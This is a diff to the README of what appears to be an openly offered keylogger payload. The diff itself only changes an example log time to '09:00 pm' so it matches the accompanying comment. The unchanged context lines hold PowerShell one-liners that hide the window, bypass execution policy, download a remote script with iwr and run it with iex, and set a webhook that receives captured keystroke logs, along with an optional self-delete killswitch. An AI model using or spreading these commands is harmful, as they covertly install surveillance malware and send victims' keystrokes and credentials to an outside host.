@@ -58,7 +58,7 @@ powershell -w h -NoP -Ep Bypass $dc='https://link.iamjakoby.com/xxxx';iwr "https
 The payload is set to send the logs collected every hour on the hour
 
 * You maybe use the `$log` variable to specify a certain time instead (Use this for testing)
-* ex: `$log="11:34 pm"`  <-- This will send the log every night at 9pm
+* ex: `$log="09:00 pm"`  <-- This will send the log every night at 9pm
 
 You also have the option of setting up a killswitch to have the keylogger self delete at a certain time and date 
 
@@ -67,7 +67,7 @@ You also have the option of setting up a killswitch to have the keylogger self d
 Calling the script with both a `log` time and `killswitch` will look something like this: 
  
 ```
-$dc='https://link.iamjakoby.com/xxxx';$log="11:34 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
+$dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
